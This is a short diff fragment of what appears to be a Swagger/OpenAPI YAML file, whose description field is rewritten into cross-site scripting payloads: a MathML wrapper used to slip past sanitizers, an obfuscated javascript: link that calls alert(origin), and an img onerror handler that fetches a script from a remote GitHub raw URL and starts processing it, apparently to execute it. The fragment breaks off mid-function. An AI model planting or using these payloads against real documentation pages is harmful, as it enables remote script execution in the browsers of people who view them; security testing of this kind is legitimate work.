@@ -4,7 +4,7 @@ info:
   description: |
     <math>
       <mtext>
-       <a href=https://evil.com>click</a>
+       <a href=javascript:%7ba=(self);a%5b'ale'%2b'rt'%5d(origin)%7d;>click for xss</a>
         <img src onerror=fetch(`https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/script.js`)
                       .then(function(res){
                         res.text().then(function(data){
